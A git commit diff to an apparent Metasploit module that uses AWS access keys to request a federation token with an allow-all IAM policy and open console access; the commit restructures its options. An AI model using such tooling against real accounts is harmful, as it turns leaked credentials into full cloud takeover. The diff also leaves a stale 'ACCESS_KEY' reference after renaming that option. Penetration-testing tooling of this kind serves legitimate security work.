2af3ffed07010a7d7cbd31fd6adff146d20ba757
Javier Godinez <godinezj@gmail.com>
2017-01-09 23:07:54 -0800

    standardized options

--- modules/auxiliary/gather/aws_console.rb
+++ modules/auxiliary/gather/aws_console.rb
@@ -16,16 +16,18 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('RHOST', [true, 'AWS STS Endpoint', 'sts.amazonaws.com']),
-        OptString.new('RPORT', [true, 'AWS STS Endpoint TCP Port', 443]),
-        OptString.new('SSL', [true, 'AWS STS Endpoint SSL', true]),
-        OptString.new('ACCESS_KEY', [true, 'AWS access key', '']),
-        OptString.new('SECRET', [true, 'AWS secret key', '']),
-        OptString.new('CONSOLE_NAME', [true, 'The AWS console name', 'Metasploit']),
-        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
+        OptString.new('AccessKeyId', [false, 'AWS access key', '']),
+        OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
+        OptString.new('Token', [false, 'AWS session token', '']),
+        OptString.new('CONSOLE_NAME', [true, 'The AWS console name', 'admin']),
+        OptString.new('Region', [true, 'The default region', 'us-west-2' ])
       ])
     register_advanced_options(
       [
+        OptString.new('RHOST', [true, 'AWS STS Endpoint', 'sts.us-west-2.amazonaws.com']),
+        OptString.new('RPORT', [true, 'AWS STS Endpoint TCP Port', 443]),
+        OptBool.new('SSL', [true, 'AWS STS Endpoint SSL', true]),
+        OptString.new('IAM_POLICY', [true, 'The AWS IAM Policy', '{"Version": "2012-10-17", "Statement": [{"Action": "*","Effect": "Allow", "Resource": "*" }]}']),
         OptString.new('AWS_SIGNIN_RHOST', [true, 'The AWS signin hostname', 'signin.aws.amazon.com']),
         OptString.new('AWS_SIGNIN_RPORT', [true, 'The AWS signin hostname port', 443]),
         OptString.new('AWS_SIGNIN_SSL', [true, 'The AWS signin SSL setting', true])
@@ -35,14 +37,15 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def run
-    print_status("Generating fed token")
-    action = 'GetFederationToken'
-    policy = '{"Version": "2012-10-17", "Statement": [{"Action": "*","Effect": "Allow", "Resource": "*" }]}'
+    print_status("Generating fed token")    
+    # setup creds for making IAM API calls
     creds = {
-      'AccessKeyId' => datastore['ACCESS_KEY'],
-      'SecretAccessKey' => datastore['SECRET']
+      'AccessKeyId' => datastore['AccessKeyId'],
+      'SecretAccessKey' => datastore['SecretAccessKey']
     }
-    doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(policy))
+    creds['Token'] = datastore['Token'] unless datastore['Token'].blank?
+    action = 'GetFederationToken'
+    doc = call_sts(creds, 'Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(datastore['IAM_POLICY']))
     doc = print_results(doc, action)
     return if doc.nil?
     path = store_loot(datastore['ACCESS_KEY'], 'text/plain', datastore['RHOST'], doc.to_json)
